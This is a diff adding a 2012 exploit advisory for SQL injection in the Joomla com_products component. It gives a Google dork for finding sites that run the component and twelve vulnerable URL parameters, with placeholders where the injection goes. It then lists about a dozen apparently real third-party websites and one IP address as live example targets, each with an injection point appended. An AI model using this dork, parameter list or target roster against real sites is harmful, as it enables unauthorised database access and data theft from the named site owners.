@@ -1,0 +1,45 @@
+Joomla Component com_products SQL注入漏洞
+
+[Joomla Component com_products SQL注入漏洞 全文]
+[ Joomla Component com_products Multiple SQLi Vulnerability ]
+
+
+[x] Author : the_cyber_nuxbie
+[x] Home   : www.thecybernuxbie.com
+[x] E-mail : staff@thecybernuxbie.com
+[x] Found  : 25 January 2012.
+[x] Tested : Windows 7 Ultimate.
+[x] Tools  : H*v*j + SQLi Manual.
+[x] Dork   : inurl:"/index.php?option=com_products"
+________________________________________________________________
+****************************************************************
+
+
+[x] Vuln Exploit Report:
+http://localhost/index.php?option=com_products&task=category&catid=[SQL Injection]
+http://localhost/index.php?option=com_products&id=[SQL Injection]
+http://localhost/index.php?option=com_products&catid=[SQL Injection]
+http://localhost/index.php?option=com_products&product_id=[SQL Injection]
+http://localhost/index.php?option=com_products&task=detail&parent_id=[SQL Injection]
+http://localhost/index.php?option=com_products&task=edit_productdetail&id_pro=[SQL Injection]
+http://localhost/index.php?option=com_products&Itemid=53&controller=home&task=displayitem&itemcode=[SQL Injection]
+http://localhost/index.php?option=com_products&catid=1&Cat[]=[SQL Injection]
+http://localhost/index.php?option=com_products&cid=[SQL Injection]
+http://localhost/index.php?option=com_products&view=products&id=19&cat=[SQL Injection]
+http://localhost/index.php?option=com_products&task=product&pid=[SQL Injection]
+http://localhost/index.php?option=com_products&Itemid=[SQL Injection]
+
+
+- Example Website Vuln:
+http://calconsystems.com/index.php?option=com_products&catid=23'' + [SQL Injection]
+http://krudkutter.com/index.php?option=com_products&task=category&catid=2'' + [SQL Injection]
+http://winnersedge.in/index.php?option=com_products&id=7'' + [SQL Injection]
+http://lightingplastics.com/index.php?option=com_products&product_id=51'' + [SQL Injection]
+http://kiserrenovations.com/index.php?option=com_products&task=detail&parent_id=2'' + [SQL Injection]
+http://mekongtech.net/index.php?option=com_products&task=edit_productdetail&id_pro=120'' + [SQL Injection]
+http://questleisure.com/index.php?option=com_products&Itemid=53&controller=home&task=displayitem&itemcode=7519'' + [SQL Injection]
+http://bonefracturetreatment.com/index.php?option=com_products&catid=1&Cat[]=44'' + [SQL Injection]
+http://natcobd.com/index.php?option=com_products&cid=3'' + [SQL Injection]
+http://rocky-s.com/index.php?option=com_products&view=products&id=19&cat=20'' + [SQL Injection]
+http://173.254.37.56/index.php?option=com_products&task=product&pid=4'' + [SQL Injection]
+http://questleisure.com/index.php?option=com_products&Itemid=53'' + [SQL Injection]
